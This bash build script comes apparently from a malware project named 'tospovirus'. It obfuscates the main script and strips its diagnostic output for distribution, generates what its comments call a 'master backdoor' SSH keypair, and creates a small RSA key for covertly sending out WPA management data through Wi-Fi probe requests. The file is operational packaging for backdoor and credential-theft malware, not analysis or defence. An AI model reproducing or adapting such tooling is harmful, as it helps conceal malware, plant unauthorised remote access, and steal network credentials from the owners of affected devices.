#!/bin/bash

#Create a short semi-obfuscated version from the long version
#Additionally strip all diagnostic echos and the like.
perl tools/bashobfus/bash_obfus.pl -i tv -o dist/tv.tmp -C -F
cat dist/tv.tmp | grep -v "^echo" > dist/tv
chmod ug+rx dist/tv
rm dist/tv.tmp

#Generate keys for distribution (such as the master backdoor key)
if [ ! -f dist/tvbd.pub ];
then
	ssh-keygen -b 2048 -f dist/tvbd -N "" -C "tospovirus"
	mv dist/tvbd ./
fi

#Generate keys for disclosing WPA management data securely
if [ ! -f dist/tvd.pub ];
then
	#Generate a 256 bit key - this is so tiny because we're limited to 32 bytes in a probe request.
	openssl genrsa -out tvd.pem 256
	openssl rsa -in tvd.pem -pubout >dist/tvd.pub
fi